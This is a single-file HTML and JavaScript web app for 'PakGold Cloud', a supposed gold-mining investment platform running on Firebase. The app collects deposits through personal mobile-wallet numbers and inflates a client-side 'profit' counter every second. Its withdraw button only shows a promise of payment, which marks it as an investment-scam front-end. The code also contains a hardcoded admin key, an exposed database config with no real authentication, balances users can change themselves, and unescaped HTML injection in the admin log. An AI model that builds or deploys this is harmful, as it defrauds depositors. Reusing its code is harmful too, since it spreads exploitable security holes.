<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PakGold | Professional Cloud</title>
    <!-- Firebase Compat SDKs (Better for single file apps) -->
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-database-compat.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #d4af37; --gold-dark: #b8860b; --bg: #f8fafc; --white: #ffffff; --text: #1e293b; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
        body { background: var(--bg); color: var(--text); }

        .page { display: none; min-height: 100vh; padding-bottom: 90px; animation: fadeIn 0.4s ease; }
        .page.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* Modern Header */
        .header { background: var(--white); padding: 40px 20px 25px; border-radius: 0 0 35px 35px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; border-bottom: 2px solid var(--gold); }
        .balance-row { display: flex; gap: 12px; margin-top: 20px; }
        .card { flex: 1; background: var(--white); padding: 15px; border-radius: 20px; border: 1px solid #f1f5f9; box-shadow: 0 4px 15px rgba(0,0,0,0.02); }
        .card small { font-size: 0.6rem; color: #94a3b8; font-weight: 800; text-transform: uppercase; }
        .card b { display: block; font-size: 1.1rem; color: var(--gold-dark); margin-top: 5px; }

        /* Modern Login */
        .login-box { background: white; padding: 30px; border-radius: 30px; box-shadow: 0 15px 45px rgba(0,0,0,0.05); width: 90%; max-width: 400px; margin: auto; }
        input, select { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid #e2e8f0; outline: none; background: #fdfdfd; }
        .btn { background: var(--gold-dark); color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: 800; cursor: pointer; transition: 0.3s; }
        .btn:active { transform: scale(0.96); }

        /* Plans Grid */
        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; padding: 20px; }
        .p-card { background: white; padding: 20px; border-radius: 25px; text-align: center; border: 1px solid #edf2f7; position: relative; }
        .p-icon { font-size: 2.5rem; margin-bottom: 10px; display: block; }

        /* Navigation */
        .nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 15px; border-top: 1px solid #eee; border-radius: 25px 25px 0 0; }
        .nav-link { text-align: center; font-size: 0.7rem; color: #cbd5e1; cursor: pointer; }
        .nav-link.active { color: var(--gold-dark); font-weight: 800; }
    </style>
</head>
<body onload="initApp()">

    <!-- LOGIN PAGE -->
    <section id="login" class="page active">
        <div style="height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center;">
            <div style="font-size: 4rem; margin-bottom: 20px;">⚜️</div>
            <div class="login-box">
                <h2 style="text-align:center; margin-bottom:20px;">Welcome Sweetie</h2>
                <input type="text" id="phone" placeholder="Phone Number">
                <input type="password" id="adminKey" placeholder="Secret Key (Optional)">
                <button class="btn" onclick="handleAuth()">LOGIN / REGISTER</button>
            </div>
        </div>
    </section>

    <!-- DASHBOARD -->
    <section id="home" class="page">
        <div class="header">
            <h3 style="letter-spacing:1px;">PAK GOLD CLOUD</h3>
            <div class="balance-row">
                <div class="card">
                    <small>Wallet</small>
                    <b id="w-bal">Rs 0</b>
                </div>
                <div class="card">
                    <small>Profit</small>
                    <b id="p-bal">Rs 0.0000</b>
                </div>
            </div>
            <div id="status" style="margin-top:10px; font-size:0.6rem; color:#94a3b8;">Connecting to Database...</div>
        </div>
        <div class="grid" id="plan-grid"></div>
    </section>

    <!-- DEPOSIT -->
    <section id="deposit" class="page">
        <div class="header"><h3>Deposit Funds</h3></div>
        <div style="padding:20px;">
            <div class="card" style="margin-bottom:15px; text-align:left;">
                <p style="font-size:0.75rem;"><b>Jazz/SadaPay:</b> 03705519562<br><b>EasyPaisa:</b> 03379827882</p>
            </div>
            <select id="d-method"><option>JazzCash</option><option>SadaPay</option><option>EasyPaisa</option></select>
            <input type="number" id="d-amt" placeholder="Amount">
            <input type="text" id="d-tid" placeholder="TID Number">
            <label style="font-size:0.6rem;">Upload Receipt Proof:</label>
            <input type="file" id="d-file" accept="image/*">
            <button class="btn" onclick="submitDeposit()">Submit for Approval</button>
        </div>
    </section>

    <!-- SECRET ADMIN -->
    <section id="admin" class="page">
        <div class="header"><h3>Secret Admin Console</h3></div>
        <div id="admin-logs" style="padding:20px; font-size:0.7rem;"></div>
    </section>

    <!-- FOOTER -->
    <nav class="nav" id="navbar" style="display:none;">
        <div class="nav-link active" onclick="nav('home')">🏠<br>Home</div>
        <div class="nav-link" onclick="nav('deposit')">💰<br>Deposit</div>
        <div class="nav-link" onclick="alert('Withdrawals process in 24h')">💸<br>Withdraw</div>
    </nav>

    <script>
        // --- REAL FIREBASE CONFIG (Connected!) ---
        const firebaseConfig = {
            apiKey: "AIzaSyCMG6KG_oD8cjEk4YpbxXik-C5q8K5MDHk",
            authDomain: "dark-web-9.firebaseapp.com",
            databaseURL: "https://dark-web-9-default-rtdb.firebaseio.com",
            projectId: "dark-web-9",
            storageBucket: "dark-web-9.firebasestorage.app",
            messagingSenderId: "564328425161",
            appId: "1:564328425161:web:eb109ab77356dafe7f4f18"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const plans = [
            {n:"Basic", p:500, s:0.0005, i:"🌱"}, {n:"Pro", p:2000, s:0.0025, i:"🚀"},
            {n:"Elite", p:10000, s:0.0150, i:"💎"}, {n:"Legend", p:50000, s:0.0900, i:"🏆"}
        ];

        let userPhone = localStorage.getItem('loggedPhone');

        function initApp() {
            if(userPhone) {
                nav('home');
                startSync();
            }
            renderPlans();
        }

        function handleAuth() {
            let ph = document.getElementById('phone').value;
            let key = document.getElementById('adminKey').value;

            if(key === "pakgold786") return nav('admin');
            if(ph.length < 10) return alert("Valid number sweetie! 💋");

            userPhone = ph;
            localStorage.setItem('loggedPhone', ph);
            
            db.ref('users/' + ph).once('value', (s) => {
                if(!s.exists()) {
                    db.ref('users/' + ph).set({ wallet: 0, profit: 0, speed: 0, plan: 'none' });
                }
                location.reload();
            });
        }

        function startSync() {
            db.ref('users/' + userPhone).on('value', (s) => {
                let data = s.val();
                document.getElementById('w-bal').innerText = "Rs " + data.wallet;
                document.getElementById('p-bal').innerText = "Rs " + parseFloat(data.profit).toFixed(4);
                document.getElementById('status').innerText = data.speed > 0 ? "Mining Active ✅" : "System Standby";
            });

            // Auto-Profit Cloud Logic
            setInterval(() => {
                db.ref('users/' + userPhone).once('value', (s) => {
                    let d = s.val();
                    if(d.speed > 0) {
                        db.ref('users/' + userPhone).update({ profit: (parseFloat(d.profit) + d.speed).toFixed(4) });
                    }
                });
            }, 1000);
        }

        function renderPlans() {
            let c = document.getElementById('plan-grid');
            plans.forEach(p => {
                c.innerHTML += `<div class="p-card" onclick="buyPlan(${p.p}, ${p.s}, '${p.n}')">
                    <span class="p-icon">${p.i}</span>
                    <h4>${p.n}</h4><b>Rs ${p.p}</b>
                </div>`;
            });
        }

        function submitDeposit() {
            let tid = document.getElementById('d-tid').value;
            let amt = document.getElementById('d-amt').value;
            if(!tid || amt < 500) return alert("Enter TID and Amount!");

            db.ref('deposits/').push({ user: userPhone, amt: amt, tid: tid, time: new Date().toLocaleString() });
            alert("Sent to Admin! 💋");
            nav('home');
        }

        function buyPlan(price, speed, name) {
            db.ref('users/' + userPhone).once('value', (s) => {
                let d = s.val();
                if(d.wallet < price) return alert("Low balance sweetie! 💋");
                db.ref('users/' + userPhone).update({ wallet: d.wallet - price, speed: speed, plan: name });
                alert(name + " Activated!");
            });
        }

        function nav(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.getElementById('navbar').style.display = (id === 'login' || id === 'admin') ? 'none' : 'flex';
            if(id === 'admin') loadAdmin();
        }

        function loadAdmin() {
            db.ref('deposits/').on('value', (s) => {
                let logs = document.getElementById('admin-logs');
                logs.innerHTML = "<h4>Deposit Requests:</h4>";
                s.forEach(child => {
                    let d = child.val();
                    logs.innerHTML += `<div style="padding:10px; border-bottom:1px solid #ddd;">
                        User: ${d.user} | Rs: ${d.amt} | TID: ${d.tid}
                    </div>`;
                });
            });
        }
    </script>
</body>
</html>
